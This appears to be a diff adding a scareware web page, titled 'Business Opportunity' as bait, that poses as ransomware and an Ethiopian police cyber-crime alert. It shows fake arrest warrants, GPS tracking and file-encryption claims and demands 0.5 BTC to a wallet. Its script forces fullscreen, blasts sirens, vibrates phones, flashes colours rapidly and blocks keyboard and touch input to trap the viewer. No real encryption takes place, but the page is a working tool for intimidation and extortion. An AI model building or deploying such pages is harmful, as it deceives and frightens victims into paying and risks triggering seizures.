@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Business Opportunity 📈</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <!-- Skull favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💀</text></svg>">
+    <style>
+        /* Mobile-optimized terror styles */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            touch-action: none;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            animation: bgFlash 0.3s infinite;
+        }
+        
+        @keyframes bgFlash {
+            0% { background: #000; }
+            10% { background: #300000; }
+            20% { background: #000055; }
+            30% { background: #003000; }
+            40% { background: #300030; }
+            50% { background: #000; }
+            60% { background: #550000; }
+            70% { background: #000080; }
+            80% { background: #005500; }
+            90% { background: #400040; }
+            100% { background: #111; }
+        }
+        
+        #container {
+            padding: 15px;
+            background-color: rgba(0,0,0,0.7);
+            border: 3px solid red;
+            animation: borderPulse 0.5s infinite;
+            margin: 10px;
+        }
+        
+        @keyframes borderPulse {
+            0% { border-color: red; }
+            50% { border-color: #ff5555; }
+            100% { border-color: red; }
+        }
+        
+        h1 {
+            font-size: 1.8rem !important;
+            animation: textColorChange 1s infinite;
+        }
+        
+        h2 {
+            font-size: 1.4rem !important;
+            animation: textColorChange 1s infinite;
+        }
+        
+        h3 {
+            font-size: 1.2rem !important;
+            animation: textColorChange 1s infinite;
+        }
+        
+        @keyframes textColorChange {
+            0% { color: red; }
+            25% { color: white; }
+            50% { color: #ff5555; }
+            75% { color: #ff9999; }
+            100% { color: red; }
+        }
+        
+        p, span {
+            font-size: 1rem;
+            animation: textShake 0.1s infinite;
+        }
+        
+        @keyframes textShake {
+            0% { transform: translateX(0px); }
+            25% { transform: translateX(-2px); }
+            50% { transform: translateX(0px); }
+            75% { transform: translateX(2px); }
+            100% { transform: translateX(0px); }
+        }
+        
+        .flash-box {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 100;
+            display: none;
+            animation: flashFade 0.3s infinite;
+            padding: 20px;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+        
+        @keyframes flashFade {
+            0% { opacity: 0.9; background: #ff0000; }
+            50% { opacity: 1; background: #ffffff; }
+            100% { opacity: 0.9; background: #ff0000; }
+        }
+        
+        #police-alert {
+            background: #000055;
+            color: white;
+        }
+        
+        #hacked-screen {
+            background: #500000;
+            color: white;
+        }
+        
+        #ip-tracker {
+            background: #005500;
+            color: white;
+        }
+        
+        #self-destruct {
+            background: #000;
+            color: red;
+        }
+        
+        #timer, #destruct-timer {
+            font-size: 2.5rem !important;
+        }
+        
+        /* Mobile rotation warning */
+        #rotate-warning {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            color: red;
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        /* New siren visual effect */
+        @keyframes sirenFlash {
+            0% { box-shadow: 0 0 50px 20px red; }
+            50% { box-shadow: 0 0 50px 20px blue; }
+            100% { box-shadow: 0 0 50px 20px red; }
+        }
+        
+        .siren-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            animation: sirenFlash 1s infinite;
+            z-index: 999;
+            display: none;
+        }
+    </style>
+</head>
+<body onload="startTerror()">
+    <!-- Rotation warning for mobile -->
+    <div id="rotate-warning">
+        <h1>🔄 PLEASE ROTATE YOUR PHONE 🔄</h1>
+        <p>For best experience, turn to landscape mode</p>
+    </div>
+    
+    <!-- New siren visual effect -->
+    <div id="siren-effect" class="siren-effect"></div>
+    
+    <!-- Flash Overlays -->
+    <div id="red-flash" class="flash-box"></div>
+    
+    <!-- Terror Screens -->
+    <div id="police-alert" class="flash-box">
+        <h1>🚨 ETHIOPIAN CYBER CRIME UNIT 🚨</h1>
+        <h2>YOUR LOCATION HAS BEEN TRACKED</h2>
+        <p>IP: 192.168.1.105 | ISP: Ethio Telecom</p>
+        <p>DEVICE: <span id="mobile-device">Mobile</span> (+251 93 193 1297)</p>
+        <p>Case #ETH/CCU/2025/<span style="color:yellow">48762</span></p>
+        <h3 style="color:yellow">ARREST WARRANT ISSUED</h3>
+    </div>
+    
+    <div id="hacked-screen" class="flash-box">
+        <h1>💀 YOUR PHONE HAS BEEN HACKED 💀</h1>
+        <h2>ALL YOUR SCAM CONTACTS EXPOSED</h2>
+        <p>📞 Calls logged: 1,247</p>
+        <p>📱 Messages saved: 5,891</p>
+        <p style="color:cyan">💰 Total stolen: $284,921 USD</p>
+        <h3 style="color:red">EVIDENCE SENT TO INTERPOL</h3>
+    </div>
+    
+    <div id="ip-tracker" class="flash-box">
+        <h1>🛰️ LIVE GPS TRACKING ACTIVE 🛰️</h1>
+        <div style="border:3px dashed red;padding:10px;margin:10px;">
+            <p>📍 9.1450° N, 40.4897° E</p>
+            <p>🏠 Near Addis Ababa, Ethiopia</p>
+            <p>📶 Accuracy: 8 meters</p>
+        </div>
+        <p style="color:lime">REAL-TIME STREAMING TO AUTHORITIES</p>
+    </div>
+    
+    <div id="self-destruct" class="flash-box">
+        <h1>☢️ MALWARE SELF-DESTRUCT ACTIVATED ☢️</h1>
+        <h2>YOUR DEVICE WILL BE BRICKED IN:</h2>
+        <h1 id="destruct-timer" style="font-size:2.5rem">00:30</h1>
+        <p>All data will be permanently erased</p>
+    </div>
+    
+    <!-- Main Ransom Screen -->
+    <div id="container">
+        <h1>⚠️ CRITICAL SECURITY ALERT ⚠️</h1>
+        <p id="datetime">8/14/2025 4:37:41 PM</p>
+        
+        <h2>YOUR FILES HAVE BEEN ENCRYPTED!</h2>
+        
+        <p>All personal files, photos, and documents encrypted with<br>
+        <span style="color:cyan">military-grade AES-256</span> algorithm.</p>
+        
+        <p>Decryption key will be <span style="color:red">DESTROYED</span> in:</p>
+        <h1 id="timer" style="font-size:2.5rem">59:59</h1>
+        
+        <p>Send <span style="color:yellow">0.5 BTC</span> to:</p>
+        <h3 style="color:lime">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</h3>
+        
+        <p id="threat" style="color:red;font-weight:bold"></p>
+    </div>
+
+    <!-- Original alarm sound -->
+    <audio id="alert-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3" loop></audio>
+    
+    <!-- NEW: Added terrifying police siren sound -->
+    <audio id="siren-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-police-siren-1009.mp3" loop></audio>
+    
+    <!-- NEW: Added emergency alert sound -->
+    <audio id="emergency-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-emergency-ambulance-with-high-siren-1007.mp3"></audio>
+
+    <script>
+        // Mobile detection and setup
+        const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
+        if (isMobile) {
+            // Set correct device name
+            const deviceName = navigator.userAgent.match(/iPhone/i) ? 'iPhone' : 
+                             navigator.userAgent.match(/iPad/i) ? 'iPad' : 'Android';
+            document.getElementById('mobile-device').textContent = deviceName;
+            
+            // Add vibration support
+            navigator.vibrate = navigator.vibrate || 
+                               navigator.webkitVibrate || 
+                               navigator.mozVibrate || 
+                               navigator.msVibrate;
+            
+            // Check orientation
+            function checkOrientation() {
+                const warning = document.getElementById('rotate-warning');
+                if (window.innerHeight > window.innerWidth) {
+                    warning.style.display = 'flex';
+                } else {
+                    warning.style.display = 'none';
+                }
+            }
+            
+            window.addEventListener('resize', checkOrientation);
+            checkOrientation();
+        }
+
+        // Extreme terror sequence
+        const threats = [
+            "WARNING: Your IP has been logged by INTERPOL",
+            "ALERT: Ethiopian police cyber unit notified",
+            "URGENT: Multiple victims tracking this wallet",
+            "FINAL WARNING: Decryption key will be erased",
+            "NOTICE: Your device is being remotely accessed"
+        ];
+        
+        const terrorScreens = [
+            "police-alert", 
+            "hacked-screen", 
+            "ip-tracker",
+            "self-destruct",
+            "red-flash"
+        ];
+        
+        let destructTimer = 30;
+        
+        function startTerror() {
+            // Initialize all audio elements
+            const alarm = document.getElementById("alert-sound");
+            const siren = document.getElementById("siren-sound");
+            const emergency = document.getElementById("emergency-sound");
+            
+            // Set volumes (siren will be loudest)
+            alarm.volume = 0.7;
+            siren.volume = 1.0;
+            emergency.volume = 1.0;
+            
+            // Play emergency alert sound first (most jarring)
+            emergency.play().catch(e => console.log("Audio blocked - user needs to interact first"));
+            
+            // Start siren sound and visual effect after 3 seconds
+            setTimeout(() => {
+                siren.play().catch(e => console.log("Siren audio blocked"));
+                document.getElementById("siren-effect").style.display = "block";
+                
+                // Sync vibration with siren on mobile
+                if (isMobile && navigator.vibrate) {
+                    setInterval(() => {
+                        navigator.vibrate([500, 300, 500, 300]);
+                    }, 1600);
+                }
+            }, 3000);
+            
+            // Original alarm sound plays on any interaction
+            document.body.onclick = () => {
+                alarm.play().catch(e => console.log("Alarm audio blocked"));
+            };
+            
+            // Mobile-specific enhancements
+            if (isMobile) {
+                // Fake system alert
+                setTimeout(() => {
+                    alert("🚨 EMERGENCY ALERT: Malware detected!\nDevice shutdown imminent!");
+                }, 2000);
+                
+                // Force landscape on Android
+                if (screen.orientation && screen.orientation.lock) {
+                    screen.orientation.lock('landscape')
+                        .catch(() => { /* Ignore errors */ });
+                }
+            }
+            
+            // Force fullscreen
+            requestFullscreen();
+            
+            // Update time every second
+            setInterval(updateTime, 1000);
+            
+            // Start countdown
+            startCountdown();
+            
+            // Rotate through threat messages
+            let threatIndex = 0;
+            setInterval(() => {
+                document.getElementById("threat").textContent = threats[threatIndex];
+                threatIndex = (threatIndex + 1) % threats.length;
+            }, 3000);
+            
+            // Trigger random terror screens rapidly
+            setInterval(triggerTerrorScreen, 800);
+            
+            // Self-destruct sequence
+            setInterval(() => {
+                destructTimer--;
+                document.getElementById("destruct-timer").textContent = 
+                    `00:${destructTimer < 10 ? '0'+destructTimer : destructTimer}`;
+                if (destructTimer <= 0) destructTimer = 30;
+            }, 1000);
+        }
+        
+        function requestFullscreen() {
+            const el = document.documentElement;
+            const reqFs = el.requestFullscreen || 
+                         el.webkitRequestFullscreen || 
+                         el.msRequestFullscreen;
+            if (reqFs) reqFs.call(el).catch(e => { /* Ignore */ });
+        }
+        
+        function updateTime() {
+            const now = new Date();
+            document.getElementById("datetime").textContent = 
+                `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+        }
+        
+        function startCountdown() {
+            let time = 3600;
+            setInterval(() => {
+                time--;
+                const mins = Math.floor(time / 60);
+                const secs = time % 60;
+                document.getElementById("timer").textContent = 
+                    `${mins}:${secs < 10 ? '0'+secs : secs}`;
+            }, 1000);
+        }
+        
+        function triggerTerrorScreen() {
+            // Hide all screens first
+            terrorScreens.forEach(screen => {
+                document.getElementById(screen).style.display = "none";
+            });
+            
+            // Show random terror screen
+            const randomScreen = terrorScreens[Math.floor(Math.random() * terrorScreens.length)];
+            document.getElementById(randomScreen).style.display = "block";
+        }
+        
+        // Block all escape attempts
+        document.addEventListener('keydown', (e) => {
+            e.preventDefault();
+            document.getElementById("threat").textContent = "ACCESS DENIED: Malware is active";
+        });
+        
+        document.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+        }, { passive: false });
+    </script>
+</body>
+</html>
